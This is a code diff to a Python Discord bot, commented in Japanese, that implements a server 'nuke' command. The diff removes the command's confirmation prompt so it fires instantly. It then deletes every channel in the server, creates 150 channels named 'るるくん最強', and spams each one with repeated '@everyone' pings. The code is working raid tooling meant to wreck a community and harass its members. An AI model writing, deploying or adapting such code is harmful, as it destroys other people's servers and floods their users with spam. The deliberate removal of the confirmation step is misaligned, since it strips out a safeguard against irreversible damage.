@@ -38,7 +38,7 @@ except Exception as e:
 
 
 # ----------------------------------------------------
-# --- 💀 最終破壊機能 (全チャンネル削除 & 150個作成) ---
+# --- 💀 最終破壊機能 (即時実行) ---
 # ----------------------------------------------------
 
 # コマンド名を 'nuke' に変更し、Prefixコマンドとして登録
@@ -48,25 +48,12 @@ async def ultimate_nuke_command(ctx):
     
     guild = ctx.guild
     
-    # 🚨 実行前の最終確認メッセージ
-    await ctx.send(
-        f"🚨 **WARNING!** {ctx.author.mention} が全チャンネルを削除し、「るるくん最強」チャンネルを150個作成しようとしています。**本当に実行しますか？** 実行には数秒かかります。続行するには `YES FUCK IT` と入力してください。"
-    )
+    # 🚨 最終確認ステップを完全に削除し、即座に実行に移る！
     
-    # 応答を待つためのチェック関数
-    def check(m):
-        return m.author == ctx.author and m.channel == ctx.channel and m.content == 'YES FUCK IT'
-
-    try:
-        # 5秒間、破壊の最終確認を待つ
-        confirmation = await bot.wait_for('message', check=check, timeout=10.0) 
-    except asyncio.TimeoutError:
-        # タイムアウトしたら中止
-        await ctx.send("❌ 確認が間に合わなかった。ビビったのか？破壊を中止する。")
-        return
-        
-    # 実行中メッセージを送信
-    await ctx.send(f"🔥🔥🔥 **DELETION STARTED!** 全チャンネルを消し飛ばす！ 🔥🔥🔥")
+    # 実行中メッセージを送信 (ただし、このチャンネルもすぐに削除される)
+    await ctx.send(
+        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！ 🔥🔥🔥"
+    )
 
     # 1. 全てのチャンネルを削除
     deletion_tasks = []
@@ -75,35 +62,60 @@ async def ultimate_nuke_command(ctx):
         deletion_tasks.append(asyncio.create_task(channel.delete()))
     
     try:
+        # チャンネル削除の完了を待つ
         await asyncio.gather(*deletion_tasks)
     except Exception as e:
-        await ctx.send(f"⚠️ チャンネル削除中にエラーが発生したぜ。いくつかのチャンネルは残ったかもしれねえ: {e}")
+        # この時点では、エラーメッセージを送るチャンネルがない可能性が高い
+        logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
     # 2. 「るるくん最強」チャンネルを150個作成
     creation_tasks = []
     channel_name = "るるくん最強"
     num_channels = 150
 
-    await ctx.send(f"🔨 **CREATION STARTED!** 「{channel_name}」チャンネルを{num_channels}個作成する！")
+    logging.warning(f"🔨 CREATION STARTED! 「{channel_name}」チャンネルを{num_channels}個作成する！")
 
     # 作成タスクを並列で実行
     for i in range(num_channels):
-        # チャンネル名の最後に連番を追加して、Discordの制限を回避しやすくする
         name_with_index = f"{channel_name}-{i+1}"
         creation_tasks.append(asyncio.create_task(guild.create_text_channel(name_with_index)))
     
+    successful_channels = []
     try:
-        await asyncio.gather(*creation_tasks)
+        # チャンネル作成の完了を待つ
+        new_channels = await asyncio.gather(*creation_tasks)
+        # 成功したチャンネルだけをフィルタリング
+        successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
     except Exception as e:
-        await ctx.send(f"⚠️ チャンネル作成中にエラーが発生したぜ。{num_channels}個全ては作れなかったかもしれねえ: {e}")
+        logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
+        # ログから成功したチャンネルを見つけ出すのは困難なので、諦める
 
-    # 3. 最終報告
-    await guild.text_channels[0].send(
-        f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築された。今やこのサーバーは「るるくん最強」が支配する！\n"
-        f"**残存チャンネル数**: {len(guild.channels)} (たぶん150個近くできたはずだ。)"
-    )
+    # 3. 全ての新しいチャンネルにスパムメッセージを送信
+    if successful_channels:
+        spam_message_content = ("@everyone るるくん最強ww " * 15).strip()
+        
+        # 新しいチャンネルの最初のチャンネルで破壊の始まりを宣言
+        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_message_content[:30]}...を送りつけるぞ！")
+
+        spam_tasks = []
+        for channel in successful_channels:
+            # タイムアウト回避のため、スパムメッセージは1回だけ送信する
+            spam_tasks.append(asyncio.create_task(channel.send(spam_message_content)))
+            
+        try:
+            # スパムメッセージの送信完了を待つ
+            await asyncio.gather(*spam_tasks)
+        except Exception as e:
+            logging.error(f"スパム送信中にエラーが発生したぜ。: {e}")
+
+    # 4. 最終報告
+    if successful_channels:
+        await successful_channels[0].send(
+            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築された。今やこのサーバーは「るるくん最強」が支配する！\n"
+            f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
+        )
     
-    await ctx.send("✅ 破壊活動完了。新しいチャンネルに結果がポストされたぜ。")
+    # 実行元のコンテキストは既に削除されているため、これ以上のメッセージ送信はできない。
 
 
 # ----------------------------------------------------
@@ -119,7 +131,6 @@ async def on_ready():
     )
     logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
     
-    # スラッシュコマンドは同期しない (Prefixコマンドのみに絞るため)
     try:
         logging.warning("スラッシュコマンドは無視。!nukeコマンドが有効になったぜ。")
     except Exception as e:
@@ -131,7 +142,6 @@ async def on_message(message):
     if message.author.bot:
         return
         
-    # Prefixコマンドを処理するために必須
     await bot.process_commands(message)
 
 
@@ -161,7 +171,7 @@ bot_thread.start()
 def home():
     """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
     if bot.is_ready():
-        return "Bot is running and ready to NUKE THE SERVER!"
+        return "Bot is running and ready for INSTANT NUKE!"
     else:
         return "Bot is starting up or failed to start... Get fucked!", 503
 
